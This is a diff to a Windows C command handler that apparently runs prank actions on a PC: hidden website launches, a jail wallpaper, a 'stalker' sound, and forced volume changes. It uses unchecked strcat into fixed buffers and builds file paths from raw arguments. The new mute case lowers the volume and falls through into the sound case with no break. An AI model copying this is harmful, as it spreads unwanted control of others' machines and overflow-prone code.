@@ -37,7 +37,7 @@ void openLink(const char *site) {
         JBlogErr("Not enough arguments");
         return;
     }
-    char url[256] = "www."; // i aint typin' www. everytime
+    char url[CMD_ARGSZ] = "www."; // i aint typin' www. everytime
     strcat(url, site);
 
     ShellExecuteA(NULL, "open", url, NULL, NULL, SW_HIDE);
@@ -47,9 +47,9 @@ void openLink(const char *site) {
 const char *PCName;
 static char wallpaper[MAX_PATH] = BADPATH;
 
+
 void popupW(char *argz) {
     wchar_t wargz[CMD_ARGSZ];
-    wchar_t *ptr;
     MultiByteToWideChar(CP_UTF8, 0, argz, -1, wargz, CMD_ARGSZ); // turn argz to wchar and put it in wargz
     
 #ifndef TELTHAR_STUPID_WIDE_CHAR
@@ -109,6 +109,7 @@ void execCommand(JBCMD cmd)
     /* --- Templates --- */
     case JB_FUN:
         CreateLinks(180);
+        SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_UP);
         PlaySoundA("res\\stalker.wav", NULL, SND_FILENAME | SND_ASYNC);
         changeWallpaper("res\\jail.png");
         break;
@@ -122,11 +123,13 @@ void execCommand(JBCMD cmd)
         exit(0); // just in case
         break;
 
-    /* --- Sounds --- */
+    /* --- Audio --- */
     case JB_VOLUME:
-        
+        SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_UP); // literally raw system mesage
         break;
-    case JB_SZAMBO:
+    case JB_MUTE:
+        SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_DOWN);
+    case JB_SZAMBO: // it has to be a .wav file
         char path[CMD_ARGSZ] = "res\\";
         strcat(path, cmd.args);
         PlaySoundA(path, NULL, SND_FILENAME | SND_ASYNC);
